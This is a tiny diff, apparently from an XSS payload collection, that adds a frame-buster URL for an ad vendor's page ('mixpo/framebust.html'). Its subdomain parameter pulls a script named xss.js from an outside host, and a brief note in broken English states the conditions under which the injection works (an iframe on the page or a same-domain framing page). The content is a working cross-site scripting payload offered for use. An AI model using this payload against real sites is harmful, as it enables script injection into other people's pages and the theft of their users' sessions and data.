@@ -1,0 +1,3 @@
+/mixpo/framebust.html?subdomain=bgtian.life/xss.js?
+
+This one currently work only if you can have a iframe on the page (this happens with some CMP added to all page even, buster page) or if you can have a page on the same domain to have an iframe to this url
